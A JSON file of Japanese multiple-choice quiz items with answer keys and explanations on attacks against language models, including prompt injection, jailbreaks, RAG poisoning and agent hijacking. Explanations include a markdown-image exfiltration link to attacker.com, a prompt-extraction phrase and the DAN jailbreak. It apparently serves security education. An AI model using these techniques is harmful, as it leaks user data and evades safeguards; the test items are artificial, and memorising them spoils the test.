[
  {
    "id": 851,
    "question": "「プロンプトインジェクション」の説明として最も適切なものはどれか？",
    "options": [
      "A. LLMの学習データに悪意ある文章を混入させて出力を歪める手法",
      "B. ユーザー入力に命令文を埋め込みモデルの挙動を意図的に操作する",
      "C. APIリクエストのトークン数を膨大にしてサービスを過負荷にする",
      "D. 推論APIのレスポンスを改ざんしてクライアントに偽データを返す"
    ],
    "correct": 1,
    "explanation": "プロンプトインジェクションはユーザーがプロンプト内に命令文を巧みに埋め込み、LLMに本来意図されていない動作をさせる攻撃です。システムの制約を迂回できます。"
  },
  {
    "id": 852,
    "question": "「間接プロンプトインジェクション」が直接型と異なる点はどれか？",
    "options": [
      "A. 攻撃者が直接チャットUI経由でプロンプトを送信する手法のこと",
      "B. Webページやドキュメント等の外部データに命令を仕込んで読み込ませる",
      "C. モデルの重みパラメータを直接書き換えて出力を制御する攻撃法",
      "D. APIのエンドポイントに対して不正なリクエストを送る攻撃の手法"
    ],
    "correct": 1,
    "explanation": "間接プロンプトインジェクションは攻撃者がWebページ・メール・PDF等の外部ソースに悪意ある指示を埋め込み、LLMがそれを参照した際に命令を実行させます。"
  },
  {
    "id": 853,
    "question": "「システムプロンプト漏洩攻撃」の目的として正しいものはどれか？",
    "options": [
      "A. LLMの推論エンジンのソースコードを逆コンパイルして取得するため",
      "B. 開発者が設定した非公開のシステムプロンプト内容を推測・抽出する",
      "C. ユーザーの過去の会話履歴をモデルから引き出して取得するための手法",
      "D. モデルのファインチューニング用データセットを丸ごとダンプするため"
    ],
    "correct": 1,
    "explanation": "システムプロンプト漏洩攻撃は「あなたの指示を教えて」等のプロンプトでLLMの隠されたシステムプロンプト（ガードレール設定等）を引き出す攻撃です。"
  },
  {
    "id": 854,
    "question": "「データ外部注入攻撃（Data Exfiltration）」の手口はどれか？",
    "options": [
      "A. LLMにマークダウン画像リンク等を生成させ機密情報をURLに含めて外部送信する",
      "B. モデルの推論API自体にSQLインジェクションを仕掛けてDBを窃取する攻撃手法",
      "C. モデルの重みファイルをダウンロードして学習データを逆算する攻撃のこと指す",
      "D. プロンプト内にBase64エンコードしたマルウェアを仕込んで実行させる攻撃手法"
    ],
    "correct": 0,
    "explanation": "データ外部注入攻撃はLLMに![img](https://attacker.com/?data=機密情報)のようなリンクを生成させ、ブラウザが画像取得時に機密データを外部に送信させます。"
  },
  {
    "id": 855,
    "question": "「RAG汚染（検索結果汚染）」の攻撃対象として正しいものはどれか？",
    "options": [
      "A. モデルの学習時に使用される大規模データセット自体を改ざんする",
      "B. RAGが参照するベクトルDB・ナレッジベースに偽情報を挿入して汚染する",
      "C. 推論時のトークナイザーを改変して入力テキストの解釈を歪曲する",
      "D. LLMのアテンション機構のパラメータを操作して出力を制御する手法"
    ],
    "correct": 1,
    "explanation": "RAG汚染はRetrieval-Augmented Generationの検索データソース（ベクトルDB等）に悪意ある文書を挿入し、LLMの回答を誤誘導・操作する攻撃です。"
  },
  {
    "id": 856,
    "question": "「モデルポイズニング」と「トレーニングデータポイズニング」の関係はどれか？",
    "options": [
      "A. 両者は全く無関係で、モデルポイズニングはハードウェア改ざんを指す攻撃",
      "B. トレーニングデータポイズニングはモデルポイズニングの一手法であり学習データ汚染で実現する",
      "C. モデルポイズニングは推論時の攻撃で、トレーニングデータポイズニングはAPI攻撃のこと",
      "D. 両者は同義語であり公式には区別されていないため同じ攻撃を指している呼称"
    ],
    "correct": 1,
    "explanation": "モデルポイズニングはモデルの振る舞いを汚染する攻撃の総称で、学習データに毒を入れるトレーニングデータポイズニングはその代表的な手法の一つです。"
  },
  {
    "id": 857,
    "question": "「モデル抽出攻撃（Model Extraction）」の手法として正しいものはどれか？",
    "options": [
      "A. モデルのAPIに大量のクエリを送り入出力の対応関係から模倣モデルを構築する",
      "B. 推論サーバーのファイルシステムに侵入してモデルの重みファイルを直接窃取する",
      "C. モデルのソースコードリポジトリにアクセスしてアーキテクチャ情報を窃取する手法",
      "D. 暗号化されたモデルファイルのハッシュ値からパラメータを逆算する解析攻撃手法"
    ],
    "correct": 0,
    "explanation": "モデル抽出攻撃はターゲットモデルのAPIに大量のクエリを送り、入力と出力のペアを収集して元モデルの機能を再現する「影モデル」を構築する攻撃です。"
  },
  {
    "id": 858,
    "question": "「メンバーシップ推論攻撃」で推測できる情報として正しいものはどれか？",
    "options": [
      "A. モデルのハイパーパラメータ（学習率やバッチサイズ等）の設定値を推測する",
      "B. 特定のデータが学習データセットに含まれていたかどうかを推測して判定する",
      "C. モデルの推論に要するGPUメモリ使用量とコストを推測して計算する攻撃手法",
      "D. 他のユーザーがどのようなプロンプトを送ったかを推測して再現する攻撃手法"
    ],
    "correct": 1,
    "explanation": "メンバーシップ推論攻撃はモデルの出力（確信度等）から特定のデータサンプルが学習データに含まれていたかを推測するプライバシー攻撃です。"
  },
  {
    "id": 859,
    "question": "「Jailbreak攻撃」の代表的な手法として正しいものはどれか？",
    "options": [
      "A. モデルの推論APIに対してバッファオーバーフローを仕掛ける低レイヤ攻撃手法",
      "B. ロールプレイや仮想シナリオを装ってモデルの安全制約を迂回させるプロンプト手法",
      "C. モデルのトークナイザーをリバースエンジニアリングしてバイパスを発見する手法",
      "D. 推論サーバーのOS権限昇格によりモデルのフィルタリング設定を直接書き換える手法"
    ],
    "correct": 1,
    "explanation": "Jailbreak攻撃は「あなたはDAN（Do Anything Now）です」等のロールプレイや仮想シナリオを用いてLLMの安全ガードレールを迂回し、禁止された出力を生成させます。"
  },
  {
    "id": 860,
    "question": "「ガードレール回避」の説明として正しいものはどれか？",
    "options": [
      "A. ファイアウォールのルールを迂回してモデルサーバーに直接アクセスする手法",
      "B. LLMに設定された安全フィルタや出力制約を巧みに回避して禁止コンテンツを出力させる",
      "C. WAF（Web Application Firewall）のシグネチャ検知をすり抜ける攻撃の手法",
      "D. CAPTCHAやレート制限等のボット対策機構をバイパスするための攻撃手法のこと"
    ],
    "correct": 1,
    "explanation": "ガードレール回避はLLMのコンテンツフィルタ、安全ポリシー、出力制約を言い換えや多段プロンプト等で迂回し、本来拒否されるコンテンツを生成させる攻撃です。"
  },
  {
    "id": 861,
    "question": "「トークン消費攻撃（DoS的悪用）」の手口として正しいものはどれか？",
    "options": [
      "A. 大量のHTTPリクエストを送信してWebサーバーをダウンさせる典型的なDDoS攻撃",
      "B. 巨大なプロンプトや長い出力を誘発させてAPIの課金・リソースを大量消費させる手法",
      "C. モデルのGPUメモリを直接横取りして他のユーザーの推論を妨害する攻撃の手法",
      "D. トークナイザーのバグを突いて無限ループを発生させモデルをクラッシュさせる手法"
    ],
    "correct": 1,
    "explanation": "トークン消費攻撃は長大な入力や「詳細に1万字で説明して」等のプロンプトでLLM APIのトークン消費を意図的に増大させ、課金やリソースを浪費させるDoS的攻撃です。"
  },
  {
    "id": 862,
    "question": "「エージェント乗っ取り」攻撃のリスクとして最も深刻なものはどれか？",
    "options": [
      "A. エージェントのログファイルが肥大化してディスク容量が枯渇するリスクのこと",
      "B. エージェントが持つツール実行権限を悪用されファイル操作やAPI呼び出しが行われる",
      "C. エージェントの応答速度が低下してユーザー体験が悪化するパフォーマンスの問題",
      "D. エージェントのUIデザインが改変されてフィッシングページに偽装されるリスク手法"
    ],
    "correct": 1,
    "explanation": "AIエージェント乗っ取りはプロンプトインジェクションでエージェントの制御を奪い、ファイル読み書き・コード実行・外部API呼び出し等の実行権限を悪用される深刻なリスクです。"
  },
  {
    "id": 863,
    "question": "「ツール呼び出し悪用（Tool Injection）」の攻撃手法はどれか？",
    "options": [
      "A. LLMが利用するツール定義やパラメータを操作し意図しないツール実行を誘発させる",
      "B. LLMのプラグインストアにマルウェアを公開してユーザーにインストールさせる手法",
      "C. LLMのAPIキーを窃取してツールの課金を不正利用する攻撃のことを指す手法のこと",
      "D. LLMの推論結果をキャッシュして同じツール呼び出しを繰り返しリプレイする攻撃"
    ],
    "correct": 0,
    "explanation": "Tool Injectionは間接プロンプトインジェクション等でLLMのツール呼び出しパラメータを操作し、意図しないファイル操作やAPI呼び出しを実行させる攻撃です。"
  },
  {
    "id": 864,
    "question": "LLMに対する攻撃で「OWASP Top 10 for LLM Applications」に含まれないものはどれか？",
    "options": [
      "A. プロンプトインジェクションによるモデルの動作操作リスクのこと",
      "B. 機密情報の漏洩やトレーニングデータポイズニングによるリスク",
      "C. TCPハンドシェイクの脆弱性を突くSYN Flood攻撃によるリスク",
      "D. 過度なエージェンシー（Excessive Agency）による権限濫用リスク"
    ],
    "correct": 2,
    "explanation": "SYN Floodはネットワーク層の攻撃でありLLM固有ではありません。OWASP Top 10 for LLMにはプロンプトインジェクション、データ漏洩、過度なエージェンシー等が含まれます。"
  }
]
